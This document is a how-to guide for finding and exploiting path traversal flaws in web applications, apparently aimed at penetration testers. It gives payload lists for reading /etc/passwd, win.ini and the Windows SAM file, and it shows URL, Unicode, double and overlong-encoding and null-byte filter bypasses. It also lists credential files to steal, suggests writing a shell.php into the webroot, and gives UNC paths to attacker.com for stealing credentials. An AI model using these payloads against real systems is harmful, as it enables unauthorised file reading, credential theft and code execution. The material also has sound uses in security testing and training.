
### 🔹 **Step 1: Look for Parameters That Seem to Reference Files or Directories**

Start by checking the application for any request parameters that appear to contain filenames or directory paths, like:

```
file=img/logo.png  
template=default.html  
include=config.inc
```

These are often used internally to read files from the server. If the user can control the value, they may be able to trick the server into accessing arbitrary files.

---

### 🔹 **Step 2: Test the Application's Behavior With Path Changes**

If the server behaves the same for both of these requests:

```
file=files/report.txt  
file=files/abc/../report.txt
```

...then it’s likely not filtering out `../`, which is a red flag.

Now try escalating to:

```
file=../../../../etc/passwd   (Linux)
file=..\..\..\..\windows\win.ini   (Windows)
```

If you see sensitive file contents, you’ve found a Path Traversal vulnerability.

---

### 🔹 **Step 3: If There’s Filtering – Try Common Bypass Techniques**

Most applications try to filter out or sanitize `../`, but these filters are often flawed. Try these common bypass methods:

#### **1. URL Encoding**

* Dot = `%2e`
* Forward Slash = `%2f`
* Backslash = `%5c`

Example:

```
file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### **2. Unicode Encoding (16-bit)**

* Dot = `%u002e`
* Slash = `%u2215`
* Backslash = `%u2216`

Example:

```
file=%u002e%u002e%u2215etc%u2215passwd
```

#### **3. Double URL Encoding**

* Dot = `%252e`
* Slash = `%252f`

Example:

```
file=%252e%252e%252fetc%252fpasswd
```

#### **4. Overlong UTF-8 Encoding**

* Dot = `%c0%2e`, `%e0%40%ae`, etc.
* Slash = `%c0%af`, `%c0%2f`, etc.

Example:

```
file=%c0%ae%c0%ae%c0%afetc%c0%afpasswd
```

#### **5. Nested Traversal Tricks**

If the filter removes `../` but doesn’t do it recursively, try:

```
....//
....\\
..../\
```

---

### 🔹 **Step 4: Bypass Filters Related to File Types and Paths**

#### **1. Null Byte Injection**

Some filters check file extensions (e.g., `.jpg`) and block anything else. Try injecting a null byte `%00` to terminate the string early:

```
file=../../../../boot.ini%00.jpg
```

This works when the app validates using a high-level language (e.g., Java, PHP) but reads files using a native API that stops at null bytes.

#### **2. Forced File Extensions**

If the app automatically appends `.jpg`, try:

```
file=../../../../passwd%00
```

#### **3. Directory Prefix Enforcement**

If the app forces the path to start with something like `filestore/`, you can still try:

```
filestore/../../../../etc/passwd
```

---

### 🔹 **Step 5: Combine Multiple Techniques if Needed**

Sometimes filters are layered. If:

```
file=../diagram1.jpg
```

fails, try combining traversal bypasses:

```
file=..%2fdiagram1.jpg  
file=..%u2215diagram1.jpg  
file=....//diagram1.jpg
```

And if you can't read `/etc/passwd` but can read valid files like `diagram1.jpg`, try:

```
file=/etc/passwd%00.jpg
```

---

### 🔹 **Step 6: Use File Access to Extract Valuable Info**

If you manage to read arbitrary files, prioritize these targets:

* `/etc/passwd` (Linux user accounts)
* `web.config`, `.env`, `application.properties` (configuration and credentials)
* `.log` files (sessions, usernames)
* Source code files like `.php`, `.asp` (code auditing)
* Database files, XML, or JSON sources
* Backup or hidden directories

---

### 🔹 **Step 7: If You Can Write Files – Go for Code Execution**

If the vulnerability allows writing files, you can:

1. Write a script inside the web root, then access it through the browser:

   ```
   ../../../../var/www/html/shell.php
   ```
2. Drop a script in:

   * User startup folders (for persistence)
   * `.ftpd` config to auto-execute commands
   * Cron or scheduled task files

---

## **Examples of Real Path Traversal Attacks**

**Against the web server:**

```
https://testsite/../../../../../etc/passwd  
https://testsite/..%255c..%255cboot.ini  
https://testsite/..%u2216..%u2216some/file.txt
```

**Against a web app:**

```
Original: https://testsite/foo.cgi?home=index.htm  
Attack:   https://testsite/foo.cgi?home=foo.cgi
```

**Using null byte and traversal:**

```
https://testsite/scripts/foo.cgi?page=../scripts/foo.cgi%00txt
```

In this case, the app reveals the source of `foo.cgi` by bypassing the extension check.

---

## **Absolute Path Traversal**
---

### 🔹 What is Absolute Path Traversal?

This vulnerability occurs when the system or web application allows the user to specify the **full path** of a file on the server (e.g., `/etc/passwd` or `C:\Windows\win.ini`) instead of restricting access to a specific directory.

If the application takes the path input from the user and accesses the file directly without proper validation or checks, an attacker could exploit that to read sensitive files on the server.

---

### 🔹 Examples of Potentially Vulnerable URLs

```plaintext
https://testsite/get.php?f=list  
https://testsite/get.cgi?f=5  
https://testsite/get.asp?f=test  
```

An attacker could replace the `f=` parameter with an actual file path like:

```plaintext
https://testsite/get.php?f=/var/www/html/get.php  
https://testsite/get.cgi?f=/var/www/html/admin/get.inc  
https://testsite/get.asp?f=/etc/passwd  
```

If the server returns the contents of these files, it’s clearly vulnerable.

---

### 🔹 Why Are Error Messages Important?

When the application returns verbose error messages, it might expose:

* Actual file paths on the server
* Names of internal folders
* The location of the webroot (like `/var/www/html/` or `C:\inetpub\wwwroot\`)

This information helps attackers guess valid paths and files to target.

---

### 🔹 Bypassing Filters Using **Encoding Techniques**

#### **URL Encoding Variants**

| Representation    | Meaning                |
| ----------------- | ---------------------- |
| `%2e%2e%2f`       | `../`                  |
| `%2e%2e/`         | `../`                  |
| `..%2f`           | `../`                  |
| `%2e%2e%5c`       | `..\`                  |
| `%2e%2e\`         | `..\`                  |
| `..%5c`           | `..\`                  |
| `%252e%252e%255c` | `..\` (Double Encoded) |
| `..%255c`         | `..\` (Double Encoded) |

These are tricks used to bypass filters that try to block `../` patterns.

---

#### **Unicode / UTF-8 Bypass** (Commonly works on Windows systems)

* `%c0%af` = `/`
* `%c1%9c` = `\`

These use invalid or overlong Unicode sequences that are incorrectly accepted by some systems.

---

### 🔹 Windows-Specific Tricks

#### **Shell Behavior:**

In Windows, if you append extra characters like:

* `<`, `>`, or even `"` at the end of the path
* Add extra `./` or `.\`
* Use `../` for non-existent folders

Examples:

```plaintext
file.txt...  
file.txt     (with trailing spaces)  
././file.txt  
folder/../file.txt  
```

Windows might ignore these and still access the file, helping attackers bypass input filters.

---

#### **Windows UNC Paths**

These are used to access network shares:

```plaintext
\\attacker.com\share\malicious.exe  
\\?\192.168.1.10\payloads\file.php  
```

Attackers can use these to:

* Steal **credentials** from the server
* Evade filters
* Access internal network shares the attacker normally can’t reach

---

#### **Windows NT Device Namespace**

These are low-level device paths that allow access to raw disk volumes:

```plaintext
\\.\GLOBALROOT\Device\HarddiskVolume1\Windows\System32\config\SAM  
\\.\CdRom0\autorun.inf  
```

